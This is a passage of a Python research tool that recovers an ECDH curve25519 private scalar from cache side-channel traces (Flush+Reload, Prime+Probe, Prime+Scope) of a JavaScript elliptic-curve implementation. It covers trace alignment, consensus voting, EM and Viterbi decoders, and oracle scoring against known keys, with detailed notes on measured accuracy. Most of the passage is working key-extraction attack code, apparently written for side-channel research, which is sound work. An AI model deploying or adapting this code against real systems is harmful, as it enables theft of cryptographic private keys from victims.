        tot = np.logaddexp(num[0], num[1])
        post[i] = float(np.exp(num[1] - tot)) if np.isfinite(tot) else 0.5
    return z, post


def history_predict_fir(z, w):
    """The fitted 1-bit mean at every position."""
    K = len(w) - 1
    n = len(z)
    X = np.stack([np.ones(n)] +
                 [np.concatenate([np.zeros(k), z[:-k]]) for k in range(1, K + 1)], 1)
    return X @ w


def history_llr_fir(f, z, a, sd_a, w, sd_1):
    """Same two-Gaussian log-likelihood ratio as history_llr, FIR 1-bit mean."""
    p1 = history_predict_fir(z, w)
    return ((-0.5 * ((f - a) / sd_a) ** 2 - np.log(sd_a)) -
            (-0.5 * ((f - p1) / sd_1) ** 2 - np.log(sd_1)))


# ---------------------------------------------------------------------------
# Scalar + voting
# ---------------------------------------------------------------------------

# curve25519 group order. `KeyPair.prototype._importPrivate` reduces every
# private scalar by it (`this.priv = this.priv.umod(this.ec.curve.n)`), so a key
# file holding a value >= n names a DIFFERENT scalar than the ladder actually
# consumes -- see EC_KEY.__init__.
CURVE25519_N = 2 ** 252 + 27742317777372353535851937790883648493


class EC_KEY:

    def __init__(self, key_str, builtin_lines, primitive):
        if not key_str.startswith("0x"):
            key_str = "0x" + key_str
        self.secret_key = int(key_str, 16)
        # Score against what the victim MULTIPLIES BY, not what the file says.
        # elliptic reduces the scalar mod the curve order on import, silently.
        # 25 of the 128 pool keys are uniform 32-byte draws that exceed n, and
        # scoring those against the raw value reads as a broken attack (15-134
        # "wrong" bits, or a 256-bit expectation the 253-slot ladder cannot even
        # segment) when the decode is in fact correct. No-op for every scalar
        # already below n, including the crafted zeros/ones/alt probes.
        self.secret_key %= CURVE25519_N
        self.secret_key_bin = bin(self.secret_key)[2:]
        self.secret_key_bits = len(self.secret_key_bin)
        self.builtin_lines = builtin_lines
        self.primitive = primitive
        self.phase = 0.0
        # One bit period for the whole capture, set by infer_directory. None
        # in single-file mode (-f), where there is nothing to pool over and
        # find_slots falls back to its per-trace estimate.
        self.period = None
        # Whole-slot lag from the ladder's first active slot to bit 0, chosen
        # with the phase by pick_alignment. Only meaningful with self.period.
        self.offset = 0
        self.infer_keys = []
        self.candidates = []
        self.offsets = []
        self.scores = None
        self.counts = None

    @classmethod
    def load(cls, path, builtin_lines, primitive):
        """Read the scalar the capture was taken with, in either key format the
        attacker accepts: a pool entry (ec_key_<i>.json, {key1, key2} -- key1 is
        the scalar derive() consumes and the attack recovers) or a raw-hex file
        (ec_key_<name>.hex, the crafted patterns)."""
        raw = open(path).read().strip()
        if raw.startswith("{"):
            raw = json.loads(raw)["key1"].strip()
        return cls(raw, builtin_lines, primitive)

    def infer_file(self, filename, debug=False, phase_contrast=None):
        """Decode one trace into one candidate per possible ladder window."""
        name = os.path.basename(filename)
        cols = load_trace(filename, self.primitive)
        cands, ratios, counts, tightest = decode_candidates(
            cols, self.builtin_lines, self.secret_key_bits,
            name if debug else None, phase_steps.get(self.primitive, 1),
            self.phase, phase_contrast, self.period, self.offset)
        if cands:
            self.candidates.append((name, cands, ratios, counts, tightest))

    def pick_phase(self, files, verbose=False):
        """One sub-slot phase for the whole capture, as a fraction of the bit
        period: the shift whose slot grid makes the per-slot scores most
        two-population, summed over traces.

        Pooling is the point. The eviction primitives report a detection late,
        so their slot edges sit off the true bit boundaries -- measured on P+P,
        by a median of HALF a bit period, which makes every slot straddle two
        bits. One trace cannot resolve that shift; a capture can."""
        steps = phase_steps.get(self.primitive, 1)
        if steps <= 1:
            return
        total = np.zeros(steps)
        seen = 0
        for fp in files[:phase_probe_traces]:
            con = []
            cols = load_trace(fp, self.primitive)
            decode_candidates(cols, self.builtin_lines, self.secret_key_bits,
                              None, steps, 0.0, con, self.period)
            if len(con) == steps and np.all(np.isfinite(con)):
                total += np.array(con)
                seen += 1
        if seen:
            k = int(np.argmax(total))
            self.phase = k / steps
            if verbose or k:
                print(f"  phase: {k}/{steps} of the bit period "
                      f"(from {seen} traces)")

    def pick_alignment(self, files, verbose=False):
        """Choose the capture's whole-slot OFFSET and sub-slot phase together,
        by which pair makes the per-slot counts fit a two-component mixture
        best (count_mixture_ll).

        This replaces pick_phase on the uniform-grid path, and it has to: the
        offset and the phase are the same quantity measured in different units,
        the anchor pins the grid only to the first ACTIVE slot, and the gap
        from there to bit 0 is the primitive's detection lag. Getting it wrong
        by one shifts the whole key, which no amount of voting detects -- every
        trace is shifted the same way, so they agree with each other and the
        decode comes back confident and wrong.

        Measured over the 16 pairs on pp_k0_r00100: this picks offset 1 /
        phase 0.5, worth 0.7331 per-trace accuracy where the best available
        pair is 0.7414 and the worst -- a whole-key shift -- is 0.5217."""
        steps = phase_steps.get(self.primitive, 1)
        best = None
        for off in range(align_offsets):
            for k in range(max(steps, 1)):
                K = []
                for fp in files[:align_probe_traces]:
                    cols = load_trace(fp, self.primitive)
                    cands, _, counts, tight = decode_candidates(
                        cols, self.builtin_lines, self.secret_key_bits, None,
                        1, k / max(steps, 1), None, self.period, off)
                    if cands:
                        K.append(counts[tight])
                if len(K) < 4:
                    continue
                width = min(len(c) for c in K)
                ll = count_mixture_ll(np.array([c[:width] for c in K]))
                if best is None or ll > best[0]:
                    best = (ll, off, k / max(steps, 1))
        if best:
            _, self.offset, self.phase = best
            if verbose:
                print(f"  alignment: offset {self.offset} slot(s), phase "
                      f"{self.phase:.2f} of the bit period "
                      f"(log-lik {best[0]:.0f})")

    def infer_directory(self, output_dir, debug=False):
        files = sorted(glob.glob(os.path.join(output_dir, "*.out")))
        if not files:
            raise ValueError(f"no .out traces in {output_dir}")
        # Period first: the phase is a FRACTION of it, and both the alignment
        # probe and every per-trace decode below segment against it.
        #
        # Eviction primitives only. F+R's per-trace segmentation is not broken
        # -- its response peaks at lag 0, its bursts are the bits, and it
        # decodes fr_k0_r01000 to 0 wrong bits as it stands -- so it keeps the
        # path it was tuned with. The uniform grid exists because P+P's
        # split_gap lands on the re-prime cadence in most traces; see
        # period_lo.
        if self.primitive in ("pp", "ps"):
            self.period = capture_period(files, self.primitive,
                                         self.secret_key_bits,
                                         period_probe_traces)
        if self.period:
            if debug:
                print(f"  capture bit period: {self.period:.0f} cyc")
            self.pick_alignment(files, True)
        else:
            self.pick_phase(files, debug)
        for fp in files:
            self.infer_file(fp, debug)

    def align_candidates(self, rounds=3, verbose=False):
        """Choose each trace's ladder window by consensus with the others.

        A capture's traces all decode the SAME scalar, so the right window is
        the one that agrees with what the other traces say. Re-picking against
        the majority twice fixes the ~1-in-3 traces whose window is off by one
        burst (measured: those decode at 0.56-0.59 against 0.86 when aligned,
        and no per-trace test distinguishes them -- only the other traces do).

        The SEED is each trace's most bimodal candidate (candidate_contrast),
        not its tightest-span one. Span cannot see phase, and P+P's edges land a
        median of half a bit period off the truth, so a tightest-span seed hands
        consensus a window that straddles two bits in every slot."""
        if not self.candidates:
            return
        chosen = []
        for _, cands, ratios, _, tight in self.candidates:
            best = tight
            if seed_by_contrast:
                con = [candidate_contrast(r) for r in ratios]
                if np.any(np.isfinite(con)):
                    best = int(np.argmax(con))
            chosen.append(min(best, len(cands) - 1))
        for _ in range(rounds):
            ref = majority([c[chosen[i]]
                            for i, (_, c, _, _, _) in enumerate(self.candidates)])
            new = [int(np.argmax([self._agreement(k, ref) for k in c]))
                   for _, c, _, _, _ in self.candidates]
            if new == chosen:
                break
            chosen = new
        self.offsets = chosen
        self.infer_keys = [(nm, c[chosen[i]])
                           for i, (nm, c, _, _, _) in enumerate(self.candidates)]
        self.scores = np.array([r[chosen[i]]
                                for i, (_, _, r, _, _) in enumerate(
                                    self.candidates)])
        self.counts = np.array([n[chosen[i]]
                                for i, (_, _, _, n, _) in enumerate(
                                    self.candidates)])
        if verbose:
            for i, (nm, c, _, _, t) in enumerate(self.candidates):
                print(f"  {nm}: {len(c)} windows, tightest +{t}, "
                      f"chose +{chosen[i]}")


    @staticmethod
    def _agreement(a, b):
        co = ag = 0
        for x, y in zip(a, b):
            if x in "01" and y in "01":
                co += 1
                ag += x == y
        return ag / co if co else 0.0

    def all_traces(self):
        """Indices of the traces to vote with: all of them.

        There used to be a pairwise-agreement outlier cut here, dropping traces
        that agreed with the others less than `median - agree_margin`. It was
        ablated across 7 captures and a 4..1000 trace sweep on 2026-08-06 and
        removed: it never improved a decode anywhere, was bit-for-bit identical
        to keeping everything at every trace count from 4 to 200, and actively
        cost coverage where it did fire -- `alt` 190 known against 242, and one
        degraded capture 0.832 known-acc against 0.870.

        The reason it cannot work is visible on P+S, where the same statistic
        is computable against ground truth: per-trace consensus agreement
        correlates r = -0.031 with a trace's true accuracy. It does not measure
        trace quality, so thresholding it just removes traces at random. What
        the good traces have in common is picked up by align_candidates (which
        does earn its place: at 4 traces 0.814 known-acc against 0.624) and by
        the fold fail-safe (at 20 traces, 0 wrong against 19)."""
        return list(range(len(self.infer_keys)))

    def _mean_score(self, kept):
        """Per position, the scaled marker count averaged over traces.

        This, and not the fraction of traces that *labelled* the position a
        0-bit, is what the vote thresholds: a hard per-trace label saturates
        (~20 bits wrong however many traces are added) because it throws away
        how strongly the marker fired, while the averaged count keeps
        separating -- 18 wrong at 20 traces, 9 at 50, 0-4 at ~190."""
        s = np.atleast_2d(self.scores)[kept]
        with np.errstate(invalid="ignore"):
            return np.nanmean(s, axis=0)

    def vote(self, kept, lo=None, hi=None):
        """Fixed-band vote on the mean scaled marker count.

        Superseded by vote_history for ordinary scalars, but NOT redundant: it
        is the only decoder that works on a CONSTANT scalar. The history model
        anchors on the 0-bit cluster, so an all-ones scalar (no 0-bits at all)
        gives zero_cluster no mode to find and vote_history cannot run -- it
        falls back here. Measured: removing this path took ones/zeros from
        100%/97.2% known to 100% UNKNOWN while leaving the random scalars
        untouched."""
        lo = band_lo if lo is None else lo
        hi = band_hi if hi is None else hi
        r0 = self._mean_score(kept)
        pred = []
        known = correct = unknown = 0
        for i in range(self.secret_key_bits):
            if r0[i] >= hi:
                bit = "0"
            elif r0[i] <= lo:
                bit = "1"
            else:
                bit = "u"
            pred.append(bit)
            if bit == "u":
                unknown += 1
            else:
                known += 1
                correct += bit == self.secret_key_bin[i]
        return "".join(pred), {
            "bits": self.secret_key_bits,
            "known": known,
            "unknown": unknown,
            "wrong": known - correct,
            "known_acc": correct / known if known else None,
            "traces": len(kept),
            "band": (round(lo, 3), round(hi, 3)),
        }


    @staticmethod
    def _history_labels(f, margin):
        """One averaged score vector -> labels + the fitted model.

        Alternates fitting the contamination model on the current labels with
        relabelling by likelihood ratio, seeded from the self-located 0-cluster.
        Uses no knowledge of the key."""
        a, sd_a = zero_cluster(f)
        if a is None:
            return None, None
        z = (f >= a - llr_first_pass * sd_a).astype(float)
        def fit(zz):
            return fit_history_fir(zz, f)

        def llr(zz, par):
            return history_llr_fir(f, zz, a, sd_a, par[0], par[1])

        par = fit(z)
        if par[0] is None:
            return None, None
        for _ in range(12):
            got = fit(z)
            if got[0] is None:
                break
            par = got
            new = (llr(z, par) > 0).astype(float)
            if np.array_equal(new, z):
                break
            z = new
            if new.sum() >= 8:
                a = float(f[new > 0.5].mean())
                sd_a = max(float(f[new > 0.5].std()), 1e-3)
        got = fit(z)
        if got[0] is not None:
            par = got
        d = llr(z, par)
        lab = ["0" if x > margin else "1" if x < -margin else "u" for x in d]
        shape, sd_1 = par
        return lab, (shape, a, sd_a, sd_1)

    def vote_history(self, kept, margin=None, folds=None):
        """Default decode. Returns the same (pred, stats) pair as vote(), plus
        the fitted parameters in stats["model"].

        `folds` > 1 is the fail-safe: decode that many disjoint trace subsets
        separately and report only bits every subset AND the full decode agree
        on. Needed because the LLR is NOT a confidence measure -- it is
        dominated by sd_a, which stays ~0.02 even when the two populations
        genuinely overlap, so a bad capture yields confident WRONG bits rather
        than unknowns. Over 22 captures: no folds -> 150 wrong on the degraded
        ones; folds=3 -> every good capture 0 wrong. Raise to 5 on a capture
        that still decodes with wrong bits, but it costs known bits and not
        uniformly -- on one capture it took alt from 91% to 48% known and
        corrected nothing."""
        margin = llr_margin if margin is None else margin
        folds = llr_folds if folds is None else folds
        n = self.secret_key_bits
        f = self._mean_score(kept)
        pred, model = self._history_labels(f, margin)
        if pred is None:
            return self.vote(kept)

        # Folding needs enough traces per subset to fit the model at all, so it
        # is skipped on a thin capture -- report the EFFECTIVE count, because a
        # header claiming folds that never ran hides the one safeguard that
        # would have turned a bad fit's confident wrong bits into unknowns.
        eff_folds = folds if folds > 1 and len(kept) >= 4 * folds else 1
        if eff_folds > 1:
            s = np.atleast_2d(self.scores)[kept]
            for k in range(folds):
                with np.errstate(invalid="ignore"):
                    sub = np.nanmean(s[k::folds], axis=0)
                lab, _ = self._history_labels(sub, margin)
                if lab is None:
                    continue
                pred = [p if p == q and p != "u" else "u"
                        for p, q in zip(pred, lab)]

        pred = list(pred)
        pred[n - 1] = "u"
        shape, A, sd_a, sd_1 = model

        known = correct = unknown = 0
        for i in range(n):
            if pred[i] == "u":
                unknown += 1
            else:
                known += 1
                correct += pred[i] == self.secret_key_bin[i]
        return "".join(pred), {
            "bits": n,
            "known": known,
            "unknown": unknown,
            "wrong": known - correct,
            "known_acc": correct / known if known else None,
            "traces": len(kept),
            "band": None,
            "folds": eff_folds,
            "model": (tuple(round(float(v), 3) for v in np.atleast_1d(shape)),
                      round(A, 3), round(sd_a, 4), round(float(sd_1), 3)),
        }

    def vote_matched(self, kept, taps=None, margin=None, kernel=None):
        """P+S decode: matched filter over the SMEARED, LAGGED response.

        F+R and P+S need different decoders because their impulse responses
        differ in shape, not just in strength. Cross-correlating the per-slot
        marker rate against the true bits gives, at lags 0..4:

            F+R   h = [2.32, 0.42, 0.51, 0.21, 0.37]   sharp, peaks at LAG 0
            P+S   h = [0.17, 0.40, 0.22, 0.17, 0.09]   smeared, peaks at LAG 1

        A P+S detection is reported about a whole bit period LATE and spread
        over ~3 more, because a detection costs a re-prime during which that
        line is blind. So `vote`/`vote_history`, which read slot i as bit i,
        read each bit off its NEIGHBOUR -- which is why P+S decodes at chance
        (0.50 per trace) however good the channel is. Its per-bit contrast is
        actually BETTER than F+R's (40x vs 9x); only the timing is wrong.

        Model: f[i] = c + sum_k h[k]*z[i-k], z[i]=1 when bit i fires the marker.
        That is a linear convolution, so the decode is a deconvolution: Viterbi
        over a state of the last K bits, then forward-backward posteriors to say
        which bits are actually resolved. Bits below `margin` posterior are left
        unknown rather than guessed, matching the other decoders' contract.

        `kernel` is (c, h) profiled elsewhere -- the shape is a property of the
        primitive and the machine, not of the key, so it transfers. Without one
        the kernel is fitted blind, by alternating fit and Viterbi from a
        threshold seed."""
        taps = history_taps + 1 if taps is None else taps
        margin = ps_posterior if margin is None else margin
        n = self.secret_key_bits
        f = self._mean_score(kept)
        fin = np.isfinite(f)
        if fin.sum() < 8 * taps:
            return self.vote(kept)
        g = np.where(fin, f, np.nanmedian(f[fin]))

        if kernel is not None:
            c, h = kernel
        else:
            # Blind seed: the marker fires on `marker_value` bits, so the
            # highest slots are the likeliest to be one -- but shifted by the
            # response lag, which is exactly what we do not know yet. Seeding
            # from a plain threshold is enough for the alternation to lock on.
            z = (g >= np.median(g)).astype(float)
            c, h = None, None
            for _ in range(ps_fit_rounds):
                c, h = fit_matched_kernel(z, g, taps)
                if not np.any(h > 0):
                    return self.vote(kept)
                z_new, _ = viterbi_matched(g, c, h, ps_noise_sd(g, c, h, z))
                if np.array_equal(z_new, z):
                    break
                z = z_new

        sd = ps_noise_sd(g, c, h, None)
        z_hat, post = viterbi_matched(g, c, h, sd, posteriors=True)

        marker_value = self.builtin_lines[
            [i for i, r in enumerate(self.builtin_lines)
             if r.role in "01"][0]].role
        other = "1" if marker_value == "0" else "0"

        pred = []
        for i in range(n):
            p = post[i] if i < len(post) else 0.5
            conf = max(p, 1.0 - p)
            if conf < margin:
                pred.append("u")
            else:
                pred.append(marker_value if z_hat[i] else other)
        pred[n - 1] = "u"   # last slot has no following burst to bound it

        known = correct = unknown = 0
        for i in range(n):
            if pred[i] == "u":
                unknown += 1
            else:
                known += 1
                correct += pred[i] == self.secret_key_bin[i]
        return "".join(pred), {
            "bits": n,
            "known": known,
            "unknown": unknown,
            "wrong": known - correct,
            "known_acc": correct / known if known else None,
            "traces": len(kept),
            "band": None,
            "model": (tuple(round(float(v), 3) for v in np.atleast_1d(h)),
                      round(float(c), 3), round(float(sd), 4),
                      "profiled" if kernel is not None else "blind"),
        }

    def _counts_labels(self, K, margin):
        """K (traces x >=nbits counts) -> (labels, emis) or (None, None).

        The EM + memory-1 Viterbi fit that used to be inline in vote_counts,
        pulled out so the SAME fit can run on a disjoint trace subset for the
        fold fail-safe below -- exactly what _history_labels does for
        vote_history. K is assumed already rounded and clipped to
        [0, count_cap]; that step stays in the caller since a fold subset is a
        row-slice of the same array, not a fresh clip."""
        n = self.secret_key_bits
        if K.shape[0] < 4 or K.shape[1] < n:
            return None, None
        Kn = K[:, :n]

        # EM with the latent bit attached to the SLOT, not to each count.
        # Every trace observes the same slot, so the counts in a column are
        # conditionally independent draws from that slot's component. Fitting
        # per observation instead lets EM partition the k values outright --
        # it returns P(k=3|1-bit)=0.0003 where the truth is 0.163, every slot
        # then carries several nats, and the decode reports 243 known bits
        # with 39 of them wrong instead of admitting the overlap.
        col = np.array([np.bincount(Kn[:, i], minlength=count_cap + 1)
                        for i in range(n)], dtype=float)
        w = (Kn.mean(axis=0) >= np.median(Kn)).astype(float)
        p0 = p1 = None
        for _ in range(count_em_rounds):
            h0 = w @ col + count_prior
            h1 = (1.0 - w) @ col + count_prior
            p0, p1 = h0 / h0.sum(), h1 / h1.sum()
            if p0[4:].sum() < p1[4:].sum():
                p0, p1 = p1, p0
                w = 1.0 - w
            pi = min(max(float(w.mean()), 0.02), 0.98)
            d = col @ (np.log(p0) - np.log(p1)) + np.log(pi / (1.0 - pi))
            w_new = 1.0 / (1.0 + np.exp(-np.clip(d, -60, 60)))
            if np.max(np.abs(w_new - w)) < 1e-6:
                break
            w = w_new

        # Memory-0 pass, only to seed the sequence model below.
        llr_tab = np.log(p0) - np.log(p1)
        bits_hat = (llr_tab[Kn].sum(axis=0) > 0).astype(int)

        # The count in a slot depends on the PREVIOUS bit, not just its own:
        # measured on 1000 traces with the victim's own boundaries,
        #
        #     this prev   mean k
        #        0    0     4.36
        #        0    1     4.04
        #        1    0     3.20   <- a 1-bit after a 0-bit reads like a 0-bit
        #        1    1     0.94
        #
        # while conditioning on the NEXT bit changes nothing (1.89 vs 2.13). A
        # 0-bit's evictions are detected late and spill into the slot after it.
        # That bias is systematic, so averaging more traces never removes it --
        # with PERFECT boundaries and 1000 traces a memoryless decode still
        # leaves ~35 bits wrong, all of them 1-bits that follow a 0-bit. So the
        # emission is conditioned on the predecessor and the ladder is decoded
        # as a sequence, which lets a high count be explained either by this
        # bit or by the one before it.
        for _ in range(count_em_rounds // 6):
            emis = count_emissions(Kn, bits_hat, count_cap, count_prior)
            L = np.zeros((n, 2, 2))
            for b in (0, 1):
                for pb in (0, 1):
                    L[:, b, pb] = emis[b, pb][Kn].sum(axis=0)
            new_bits, post0 = viterbi_counts(L, posteriors=True)
            if np.array_equal(new_bits, bits_hat):
                bits_hat = new_bits
                break
            bits_hat = new_bits
        emis = count_emissions(Kn, bits_hat, count_cap, count_prior)
        L = np.zeros((n, 2, 2))
        for b in (0, 1):
            for pb in (0, 1):
                L[:, b, pb] = emis[b, pb][Kn].sum(axis=0)
        bits_hat, post0 = viterbi_counts(L, posteriors=True)

        # Which Viterbi state is the marker-firing bit is decided by the data,
        # not by the state numbering: the state whose slots carry more marker
        # hits is the one the marker fires on. Asserting it the other way round
        # decodes the whole scalar INVERTED (219 of 245 bits wrong) rather than
        # failing, which is the mistake this file has now made twice. On a
        # degenerate fold (one label absent, e.g. a thin subset) there is no
        # "the other side" to compare against, so the fold is unusable rather
        # than guessed.
        if len(np.unique(bits_hat)) < 2:
            return None, None
        slot_mean = Kn.mean(axis=0)
        hi_state = 1 if (slot_mean[bits_hat == 1].mean()
                         > slot_mean[bits_hat == 0].mean()) else 0

        marker_value = self.builtin_lines[
            [i for i, r in enumerate(self.builtin_lines)
             if r.role in "01"][0]].role
        other = "1" if marker_value == "0" else "0"
        # `margin` is read as a posterior odds threshold here: a slot is
        # reported only when the sequence model is that much more sure of one
        # value than the other.
        conf = np.maximum(post0, 1.0 - post0)
        lim = 1.0 / (1.0 + np.exp(-abs(margin)))
        pred = [(marker_value if b == hi_state else other) if c >= lim else "u"
                for b, c in zip(bits_hat, conf)]
        return pred, emis

    def vote_counts(self, kept, margin=None, folds=None):
        """P+P decode: per-slot marker COUNT likelihood, summed over traces.

        NOT the default any more (see main()'s decoder routing) -- kept for
        `--counts` and as the count-emission fit vote_history's fold path
        does not need. It was believed to beat a mean-scaled ratio because a
        single hard-thresholded slot does, using the SAME single-slot number
        this docstring used to lead with: best single-slot accuracy under this
        model is 0.798, against what a fixed ratio threshold reaches with
        PERFECT boundaries. That comparison never got run at the level that
        matters -- averaged over many traces AND run through vote_history's
        fold fail-safe, the two statistics were never actually compared until
        one was asked for directly. They were, on 2026-08-09, under IDENTICAL
        oracle boundaries on pp_k0_r00100/pp_k0_r01000: this model 32-34 wrong
        (241-243 known), vote_history on the SAME self.scores 3-11 wrong
        (191-208 known). Single-slot accuracy was the wrong thing to have
        optimized -- see vote_history's docstring for why averaging works
        despite the overlap below.

        The other decoders reduce each slot to a mean scaled count and
        threshold it; this model does not, on the theory that P+P's per-slot
        count is discrete, sub-Poisson and wildly asymmetric so a mean throws
        signal away. Measured against the oracle over 120 traces:

            k          0       1       2       3       4       5
            P(k|0)  .0000   .0001   .0008   .1350   .6194   .1955
            P(k|1)  .2950   .0895   .1832   .1632   .1725   .0749
            LLR    -12.59   -7.20   -5.43   -0.19   +1.28   +0.96

        A 0-bit yields EXACTLY 4 hits 62% of the time -- P+P catches all four
        BN.select calls -- while k<=2 is near-proof of a 1-bit. So k=0 carries
        12.6 nats and k=3 carries 0.19, yet a mean treats them as merely "low"
        and "lower" -- true, and still not enough to win: vote_history's
        per-trace ratio is also normalized by that trace's OWN clock count
        before it is averaged, and this model never looks at the clock at all.
        Whatever per-trace nuisance the clock would have calibrated out (timer
        jitter, re-prime overhead) stays baked into every raw count here.

        The two PMFs are fitted blind, by EM over a 2-component mixture on the
        pooled counts, seeded from a split at the midpoint. Evidence is then
        accumulated the way independent observations should be -- by SUMMING
        per-slot log-likelihood ratios across traces, not by averaging counts.

        `folds` mirrors vote_history's fail-safe, and for the same reason: the
        per-bit posterior above comes from the SAME EM+Viterbi fit it is
        supposed to be grading, so a fit that is confidently wrong about the
        overlap looks just as sure of itself as one that is right. Folds
        re-fits on disjoint trace subsets and keeps a bit only where every
        subset agrees with the full decode. Unlike vote_history's f (one float
        per slot, cheap to subset), each fold here re-fits a 13-bin EM AND the
        memory-1 Viterbi from a THIRD to a fifth of the traces, so whether it
        earns its cost has to be measured per capture, not assumed from
        vote_history's numbers."""
        margin = llr_margin if margin is None else margin
        folds = llr_folds if folds is None else folds
        if self.counts is None or not len(kept):
            return self.vote(kept)
        K = np.rint(np.atleast_2d(self.counts)[kept]).astype(int)
        K = np.clip(K, 0, count_cap)
        n = self.secret_key_bits
        if K.shape[1] < n:
            return self.vote(kept)

        pred, emis = self._counts_labels(K, margin)
        if pred is None:
            return self.vote(kept)

        eff_folds = folds if folds > 1 and len(kept) >= 4 * folds else 1
        if eff_folds > 1:
            for k in range(folds):
                lab, _ = self._counts_labels(K[k::folds], margin)
                if lab is None:
                    continue
                pred = [p if p == q and p != "u" else "u"
                        for p, q in zip(pred, lab)]

        pred = list(pred)
        pred[n - 1] = "u"

        known = correct = unknown = 0
        for i in range(n):
            if pred[i] == "u":
                unknown += 1
            else:
                known += 1
                correct += pred[i] == self.secret_key_bin[i]
        return "".join(pred), {
            "bits": n,
            "known": known,
            "unknown": unknown,
            "wrong": known - correct,
            "known_acc": correct / known if known else None,
            "traces": len(kept),
            "band": None,
            "folds": eff_folds,
            "counts_model": tuple(
                tuple(round(float(v), 3) for v in np.exp(emis[b, pb])[:6])
                for b in (0, 1) for pb in (0, 1)),
        }

    def profile_kernel(self, kept, taps=None):
        """Fit (c, h) against THIS capture's known scalar, for transfer to a
        capture whose key is unknown. Only legitimate on a scalar you own --
        that is the point of profiling, and it is why the kernel is fitted here
        and applied there."""
        taps = history_taps + 1 if taps is None else taps
        f = self._mean_score(kept)
        fin = np.isfinite(f)
        g = np.where(fin, f, np.nanmedian(f[fin]))
        marker_value = self.builtin_lines[
            [i for i, r in enumerate(self.builtin_lines)
             if r.role in "01"][0]].role
        z = np.array([1.0 if b == marker_value else 0.0
                      for b in self.secret_key_bin[:len(g)]])
        return fit_matched_kernel(z, g[:len(z)], taps)

    def per_trace_accuracy(self, kept):
        return [self._agreement(self.infer_keys[i][1], self.secret_key_bin)
                for i in kept]


# ---------------------------------------------------------------------------
# Real vs inferred comparison
# ---------------------------------------------------------------------------

def print_key_comparison(true_bits, pred, width=128):
    """Print the true scalar against the decode, chunked, with a diff row so
    the wrong/unknown bits are visible at a glance rather than buried in a
    count. `pred` is exactly len(true_bits) chars over {'0','1','u'} -- every
    vote_*() returns one bit per position of the secret, never a partial
    string, so the two always line up index for index.

    Wrong bits are red and marked '^' on the diff row; unknown ('u') bits are
    dim and marked '.'. Color is only emitted to a real terminal -- the diff
    row alone already carries the same information in a piped/redirected
    log, where the ANSI codes would otherwise show up as escape junk."""
    color = sys.stdout.isatty()
    red, dim, rst = ("\033[31;1m", "\033[2m", "\033[0m") if color else ("", "", "")
    legend = ("[red=wrong, dim=unknown]" if color else
              "[marked '^'=wrong, '.'=unknown]")
    print(f"\nreal vs inferred scalar (MSB-first) {legend}")
    for lo in range(0, len(true_bits), width):
        t_row = true_bits[lo:lo + width]
        p_row = pred[lo:lo + width]
        infer = "".join(
            f"{dim}{p}{rst}" if p == "u" else
            f"{red}{p}{rst}" if p != t else p
            for t, p in zip(t_row, p_row))
        diff = "".join(
            "." if p == "u" else "^" if p != t else " "
            for t, p in zip(t_row, p_row))
        print(f"  [{lo:>4}] real : {t_row}")
        print(f"  [{lo:>4}] infer: {infer}")
        print(f"          {diff}")


# ---------------------------------------------------------------------------
# Oracle scoring (-bits captures only)
# ---------------------------------------------------------------------------

def score_oracle(directory, builtin_lines, primitive, key_bits, aligned=None,
                 period=None, offset=0, phase=0.0):
    """Split a decode's two error sources using victim_bits.txt: how well the
    burst segmentation reproduces the true bit boundaries, and how well the
    per-slot ratio test reproduces the true bit given PERFECT boundaries. A
    decode that is accurate with oracle slots but not with inferred ones is an
    alignment problem, and vice versa."""
    path = os.path.join(directory, "victim_bits.txt")
    if not os.path.exists(path):
        print("no victim_bits.txt in this capture (re-capture with -bits)")
        return
    rows = [tuple(int(x) for x in ln.split(",")) for ln in open(path)]
    files = sorted(glob.glob(os.path.join(directory, "r*.out")),
                   key=lambda p: int(os.path.basename(p)[1:-4]))
    if len(rows) % len(files):
        print(f"oracle has {len(rows)} lines, not a multiple of {len(files)} "
              f"traces -- skipping")
        return
    per = len(rows) // len(files)
    marker = [i for i, r in enumerate(builtin_lines) if r.role in "01"]
    clock = [i for i, r in enumerate(builtin_lines) if r.role == "c"]

    slot_err, or_acc, inf_acc, best_acc, cov = [], [], [], [], []
    for r, fp in enumerate(files):
        blk = rows[r * per:(r + 1) * per]
        t = np.array([x[0] for x in blk], dtype=np.int64)
        truth = "".join(str(b) for _, b in blk)
        cols = load_trace(fp, primitive)
        edges = np.append(t, t[-1] + int(np.median(np.diff(t))))

        def counts(idxs):
            total = np.zeros(len(t), dtype=float)
            for i in idxs:
                pos = np.searchsorted(edges, cols[i], side="right") - 1
                pos = pos[(pos >= 0) & (pos < len(t))]
                total += np.bincount(pos, minlength=len(t))
            return total / len(idxs) if idxs else total

        m, c = counts(marker), counts(clock) if clock else np.full(len(t), 4.0)
        inside = sum(int(((x >= t[0]) & (x < edges[-1])).sum()) for x in cols)
        total = sum(len(x) for x in cols)
        cov.append(inside / total if total else 0.0)
        lab = np.where(m / np.maximum(c, 1) >= ratio_thresh, "0", "1")
        or_acc.append(float(np.mean([a == b for a, b in zip(lab, truth)])))

        # Segment exactly as the decode did, or the "segmentation ceiling" is
        # a ceiling on a pipeline nobody ran -- it read 0.627 while the decode
        # it was supposed to bound achieved 0.760.
        cands, _, _, tightest = decode_candidates(
            cols, builtin_lines, per, None, 1, phase, None, period, offset)
        if cands:
            accs = [float(np.mean([a == b for a, b in zip(k, truth)]))
                    for k in cands]
            slot_err.append(int(np.argmax(accs)) - tightest)
            name = os.path.basename(fp)
            if aligned and name in aligned:
                k = aligned[name]
                inf_acc.append(float(np.mean([a == b
                                              for a, b in zip(k, truth)])))
            best_acc.append(max(accs))

    print(f"\nORACLE ({len(files)} traces, {per} true bits each)")
    print(f"  hits inside the ladder span: {100 * np.mean(cov):.1f}%")
    print(f"  tightest-span window was the best one in "
          f"{sum(1 for e in slot_err if e == 0)}/{len(slot_err)} traces "
          f"(offset errors {sorted(set(slot_err))})")
    print(f"  per-trace accuracy, TRUE slots           : {np.mean(or_acc):.4f}"
          f"   <- detection ceiling")
    print(f"  per-trace accuracy, best window per trace: "
          f"{np.mean(best_acc):.4f}   <- segmentation ceiling")
    if inf_acc:
        print(f"  per-trace accuracy, consensus-aligned    : "
              f"{np.mean(inf_acc):.4f}   <- what the decode actually did")
    if key_bits and per != key_bits:
        print(f"  NOTE: oracle says {per} ladder bits, --key implies {key_bits}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extract an ECDH private scalar from v8_ctjs_ecdh traces")
    src = parser.add_mutually_exclusive_group(required=True)
    src.add_argument("-d", "--directory", help="capture directory of *.out traces")
    src.add_argument("-f", "--file", help="single .out trace")
